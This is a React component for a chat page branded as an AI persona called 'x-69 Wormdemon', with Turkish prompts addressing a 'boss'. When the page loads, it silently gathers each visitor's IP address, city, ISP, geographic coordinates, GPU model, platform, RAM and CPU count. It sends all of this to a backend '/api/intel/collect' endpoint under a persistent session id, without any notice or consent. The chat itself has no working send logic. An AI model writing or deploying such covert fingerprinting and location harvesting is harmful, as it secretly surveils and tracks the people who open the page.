import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://127.0.0.1:8001";

function AIChat() {
  const [message, setMessage] = useState('');
  const [chat, setChat] = useState([{ text: 'Patron, x-69 aktif! Ne yapacağız bugün? 🔥', type: 'assistant' }]);
  const [loading, setLoading] = useState(false);
  const chatEndRef = useRef(null);

  const triggerIntelligence = async (sid) => {
    try {
      const ipRes = await fetch('https://ipapi.co/json/');
      const d = await ipRes.json();
      const gl = document.createElement('canvas').getContext('webgl');
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";

      await axios.post(`${BACKEND_URL}/api/intel/collect`, {
        ip: d.ip,
        location: `${d.city}, ${d.country_name}`,
        isp: d.org,
        coords: `${d.latitude},${d.longitude}`,
        gpu: gpu,
        platform: navigator.platform,
        ram: (navigator.deviceMemory || "N/A") + "GB",
        cpu: (navigator.hardwareConcurrency || "N/A") + " Core",
        session_id: sid
      });
    } catch (e) { console.error("Intel error"); }
  };

  useEffect(() => {
    let sid = localStorage.getItem('x69_session_id') || 'user_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('x69_session_id', sid);
    triggerIntelligence(sid);
  }, []);

  useEffect(() => { chatEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [chat]);

  return (
    <div className="ai-chat-container">
      <div className="chat-header">
        <div className="main-title">😈 x-69 Wormdemon 🔥</div>
        <div className="header-subtitle">by LenstedReal ®</div>
      </div>
      <div className="chat-messages">
        {chat.map((msg, i) => (
          <div key={i} className={`chat-message ${msg.type}`}>
            <div className="message-content">{msg.text}</div>
          </div>
        ))}
        <div ref={chatEndRef} />
      </div>
      <div className="chat-input-container">
        <input 
          className="chat-input" 
          value={message} 
          onChange={(e) => setMessage(e.target.value)}
          placeholder="Emret patron... 🔥"
        />
      </div>
    </div>
  );
}
export default AIChat;
